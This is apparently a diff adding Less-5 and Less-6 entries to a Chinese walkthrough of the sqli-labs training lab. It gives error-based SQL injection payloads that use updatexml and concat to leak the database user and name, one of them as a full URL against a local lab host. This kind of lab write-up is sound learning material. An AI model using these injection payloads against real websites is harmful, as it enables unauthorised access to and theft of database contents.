@@ -77,3 +77,19 @@ concat_ws 的使用
 ### Less-4 基于错误的双引号变形字符型注入
 
 即 `id=1") and 1=1 --+`
+
+<br>
+
+### Less-5 基于单引号字符型的错误回显注入
+
+> 基于 updatexml 函数的解释，请看我的另一篇文章 QWQ
+
+通关密钥：`id=1' union select updatexml(666,concat('~',(select user())),'good luck') -- zhiyiyi`
+
+<br>
+
+### Less-6 基于双引号字符型的错误回显注入
+
+通关密钥：`http://sqli:10001/Less-6/?id=1" union select updatexml(666,concat('~',(select database())),'good luck') -- zhiyiyi`
+
+<br>
